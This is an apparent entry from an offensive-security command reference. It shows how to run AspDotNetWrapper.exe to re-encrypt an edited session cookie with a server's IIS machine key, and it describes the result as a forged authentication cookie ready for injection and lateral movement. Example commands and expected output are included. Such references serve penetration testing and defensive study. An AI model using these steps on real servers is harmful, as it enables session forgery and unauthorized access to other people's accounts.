---
id: bcf0782e-603e-431d-9006-2f751402fea8
name: encrypt-modified-cookie-with-aspdotnetwrapper
type: command
executor: cmd
data: AspDotNetWrapper.exe --decryptDataFilePath $_DECRYPTED_FILE_PATH
output: null
created_at: '2023-04-06T03:55:53.437712+00:00'
updated_at: '2023-04-06T03:55:53.449906+00:00'
platforms:
  - Windows
tags:
  - iis
  - cookie-encryption
  - lateral-movement
verified: true
validated: true
---

# encrypt-modified-cookie-with-aspdotnetwrapper

## Command

```cmd
AspDotNetWrapper.exe --decryptDataFilePath $_DECRYPTED_FILE_PATH
```

## Description

This command re-encrypts a modified plaintext cookie file using the IIS machine key, producing a valid encrypted cookie for injection. It assumes the input file was generated from a prior decryption and uses the same algorithms (HMACSHA512/AES) for compatibility. Ideal for forging authentication cookies after editing session data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --decryptDataFilePath $_DECRYPTED_FILE_PATH | Path to the plaintext file (e.g., Decrypted.txt) containing modified data | Yes |

## Examples

### Basic Usage

```cmd
AspDotNetWrapper.exe --decryptDataFilePath C:\DecryptedText.txt
```

### Advanced Usage

With a custom path:

```cmd
AspDotNetWrapper.exe --decryptDataFilePath D:\output\ModifiedCookie.txt
```

## Expected Output

Successful execution outputs the encrypted cookie to stdout or a file:

```
Encrypted Cookie: .ASPXAUTH=XYZ789GHI...
Encryption successful.
```

The output is a base64-encoded string ready for use in HTTP headers. Errors like "Invalid data format" occur if the input is not valid plaintext.

## Related

- [[procedures/IIS-Machine-Key-Cookie-Decryption-and-Encryption]]
- [[commands/decrypt-iis-cookie-with-aspdotnetwrapper]]
